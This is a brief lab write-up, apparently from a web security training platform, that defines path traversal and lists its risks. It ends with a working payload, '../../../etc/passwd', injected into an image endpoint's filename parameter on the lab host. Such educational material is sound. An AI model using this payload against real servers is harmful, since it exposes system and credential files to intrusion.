Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:

- Application code and data.
- Credentials for back-end systems.
- Sensitive operating system files.

In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.


We've got :
https://0a5f004404ae9c6f829e6a69001700f3.web-security-academy.net/

So we get to:

https://0a5f004404ae9c6f829e6a69001700f3.web-security-academy.net/image?filename=57.jpg

once that we do Path Traversal

https://0a5f004404ae9c6f829e6a69001700f3.web-security-academy.net/image?filename=../../../etc/passwd
